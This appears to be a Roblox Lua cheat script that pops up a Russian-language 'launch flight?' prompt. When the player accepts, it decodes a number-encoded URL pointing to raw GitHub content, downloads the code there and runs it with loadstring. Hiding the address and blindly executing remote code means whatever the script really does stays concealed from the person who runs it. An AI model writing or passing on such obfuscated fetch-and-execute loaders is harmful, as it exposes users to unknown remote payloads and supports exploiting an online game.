function isYhatlnkpmgrvhRZdjRzadgrdUsNZzkvvCKzrNnXUnudCPiHuMgeaRZTXzCejjtedhhCjwcTPuFPcQetZhrDFXRzhSO(code)res=''for i in ipairs(code)do res=res..string.char(code[i]/192)end return res end 



local function callback(Text)
    if Text == "Да" then
        loadstring(game:HttpGet(isYhatlnkpmgrvhRZdjRzadgrdUsNZzkvvCKzrNnXUnudCPiHuMgeaRZTXzCejjtedhhCjwcTPuFPcQetZhrDFXRzhSO({19968,22272,22272,21504,22080,11136,9024,9024,21888,18624,22848,8832,19776,20160,22272,19968,22464,18816,22464,22080,19392,21888,19008,21312,21120,22272,19392,21120,22272,8832,19008,21312,20928,9024,15936,15360,16128,16704,21312,21120,19200,19392,21888,22080,19968,18624,19392,22848,9024,13440,20736,23232,15744,21312,18816,20736,21312,23040,9024,20928,18624,20160,21120,9024,15936,19968,18624,20160,22272,18624,21120,13440,20736,20160,19776,19968,22272,8832,12864,23040,23040}, true)))()

    elseif Text == "Нет" then
        game:GetService("StarterGui"):SetCore("SendNotification",{
Title = "Очень жаль!:(",
Text = "Тун тун тун...", 
Duration = 2
})
    end
end

local NotificationBindable = Instance.new("BindableFunction")
NotificationBindable.OnInvoke = callback

game.StarterGui:SetCore("SendNotification", {
    Title = "Запускать полёт?",
    Text = "Я хотю полетать!",
    Icon = "",
    Duration = 10,
    Button1 = "Да",
    Button2 = "Нет",
    Callback = NotificationBindable,

})






